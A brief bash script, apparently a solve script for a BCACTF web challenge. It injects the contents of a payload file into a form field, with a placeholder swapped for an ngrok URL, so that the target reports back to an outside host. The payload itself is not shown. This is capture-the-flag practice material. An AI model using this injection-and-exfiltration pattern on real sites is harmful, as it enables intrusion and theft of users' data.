#! /usr/bin/env bash

curl --data-urlencode "bg=white" --data-urlencode "fg=black" --data-urlencode "bbg=black" --data-urlencode "bfg=$(cat payload.txt | sed 's;YOUR_URL_HERE;http://4aa8439051ea.ngrok.io/;g')" -X POST http://webp.bcactf.com:49153/submit